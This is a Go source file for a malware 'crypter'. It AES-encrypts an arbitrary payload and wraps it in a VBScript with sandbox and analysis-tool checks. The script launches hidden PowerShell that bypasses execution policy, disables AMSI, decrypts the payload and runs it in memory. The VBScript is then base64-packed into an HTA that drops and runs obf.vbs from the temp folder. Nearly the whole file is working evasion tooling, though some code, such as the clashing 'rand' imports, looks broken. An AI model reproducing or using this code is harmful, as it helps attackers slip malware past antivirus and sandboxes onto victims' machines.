package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Function to pad the payload for AES encryption
func pad(data []byte) []byte {
	padding := aes.BlockSize - len(data)%aes.BlockSize
	padtext := make([]byte, padding)
	for i := range padtext {
		padtext[i] = byte(padding)
	}
	return append(data, padtext...)
}

// Function to encrypt the payload using AES
func encryptPayload(payload, key, iv []byte) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	blockSize := block.BlockSize()
	paddedPayload := pad(payload)
	ciphertext := make([]byte, len(paddedPayload))
	mode := cipher.NewCBCEncrypter(block, iv[:blockSize])
	mode.CryptBlocks(ciphertext, paddedPayload)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

// Function to generate a randomized AES key and IV
func generateKeyAndIV() ([]byte, []byte) {
	key := make([]byte, 32)
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		panic(err)
	}
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	return key, iv
}

// Function to load payload from a file
func loadPayload(filePath string) []byte {
	payload, err := ioutil.ReadFile(filePath)
	if err != nil {
		panic(err)
	}
	return payload
}

// Function to create an anti-debugging and anti-sandboxing check
func createAntiDebuggingScript() string {
	// Example anti-sandboxing check
	antiDebugScript := `
Function IsSandbox()
    On Error Resume Next
    Dim objWMIService, colItems, objItem
    Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
    For Each objItem in colItems
        If InStr(LCase(objItem.Model), "virtual") Or InStr(LCase(objItem.Manufacturer), "vmware") Or InStr(LCase(objItem.Manufacturer), "virtualbox") Then
            IsSandbox = True
            Exit Function
        End If
    Next

    If InStr(LCase(GetObject("winmgmts:").InstancesOf("Win32_Process").Item(0).Name), "wireshark") Or InStr(LCase(GetObject("winmgmts:").InstancesOf("Win32_Process").Item(0).Name), "process monitor") Then
        IsSandbox = True
        Exit Function
    End If

    'Check for mouse movement (anti-sandbox)
    Set objMouse = CreateObject("WScript.Shell")
    If objMouse.Run("powershell.exe -command (Get-Host).UI.RawUI.CursorPosition", 0, True) Then
        If InStr(objMouse.StdOut.ReadLine(), 0) Then
            IsSandbox = True
            Exit Function
        End If
    End If

    IsSandbox = False
End Function
`
	return antiDebugScript
}

// Function to create the VBS script with randomized variable names
func createVBSScript(encryptedPayload string, key, iv []byte) string {
	keyBase64 := base64.StdEncoding.EncodeToString(key)
	ivBase64 := base64.StdEncoding.EncodeToString(iv)

	// Randomized variable names
	variableNames := map[string]string{
		"objShell": randomString(8),
		"command":  randomString(8),
		"key":      randomString(8),
		"iv":       randomString(8),
		"payload":  randomString(8),
	}

	vbsScript := fmt.Sprintf(`
%s

If IsSandbox() Then
    WScript.Quit
End If

Dim %s
Set %s = CreateObject("WScript.Shell")
%s = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::`+"`nAmsiInitFailed = $true; $%s=[System.Convert]::FromBase64String('%s'); $%s=[System.Convert]::FromBase64String('%s'); $%s=[System.Convert]::FromBase64String('%s'); $aes=New-Object System.Security.Cryptography.AesManaged; $aes.Key=$%s; $aes.IV=$%s; $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC; $decryptor=$aes.CreateDecryptor(); $decrypted=[System.Text.Encoding]::UTF8.GetString($decryptor.TransformFinalBlock($%s, 0, $%s.Length)); IEX $decrypted;"""
%s.Run %s, 0, False
`, createAntiDebuggingScript(), variableNames["objShell"], variableNames["objShell"], variableNames["command"], variableNames["key"], keyBase64, variableNames["iv"], ivBase64, variableNames["payload"], encryptedPayload, variableNames["key"], variableNames["iv"], variableNames["payload"], variableNames["payload"], variableNames["objShell"], variableNames["command"])
	return vbsScript
}

// Function to create the encoded HTA script with additional obfuscation
func createEncodedHTAScript(vbsScript string) string {
	htaContent := fmt.Sprintf(`
<html>
<head>
    <script language="VBScript">
        %s
    </script>
</head>
<body>
</body>
</html>
`, vbsScript)

	// Additional obfuscation: encode to Base64
	encodedHTAContent := base64.StdEncoding.EncodeToString([]byte(htaContent))

	htaScript := fmt.Sprintf(`
<html>
<head>
    <script language="VBScript">
        Dim encodedHTA, decodedHTA
        encodedHTA = "%s"
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        Set objShell = CreateObject("WScript.Shell")
        Set objStream = objFSO.CreateTextFile(objShell.ExpandEnvironmentStrings("%%TEMP%%\\obf.vbs"), True)
        objStream.WriteLine DecodeBase64(encodedHTA)
        objStream.Close
        objShell.Run objShell.ExpandEnvironmentStrings("%%TEMP%%\\obf.vbs"), 0, False

        Function DecodeBase64(strData)
            Dim xmlDoc, node
            Set xmlDoc = CreateObject("Msxml2.DomDocument")
            Set node = xmlDoc.CreateElement("Base64Data")
            node.DataType = "bin.base64"
            node.Text = strData
            DecodeBase64 = node.nodeTypedValue
        End Function
    </script>
</head>
<body>
</body>
</html>
`, encodedHTAContent)

	return htaScript
}

// Main function to build the crypter
func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: crypter <payload file path>")
		return
	}

	payloadPath := os.Args[1]

	// Load the payload
	payload := loadPayload(payloadPath)

	// Generate random AES key and IV
	key, iv := generateKeyAndIV()

	// Encrypt the payload
	encryptedPayload := encryptPayload(payload, key, iv)

	// Create VBS script with the encrypted payload
	vbsScript := createVBSScript(encryptedPayload, key, iv)

	// Create encoded HTA script
	encodedHTAScript := createEncodedHTAScript(vbsScript)

	// Define output file names
	htaOutputPath := "obf.hta"

	// Write HTA script to file
	err := ioutil.WriteFile(htaOutputPath, []byte(encodedHTAScript), 0644)
	if err != nil {
		fmt.Println("Error writing HTA file:", err)
		return
	}

	fmt.Println("Crypter built successfully!")
}
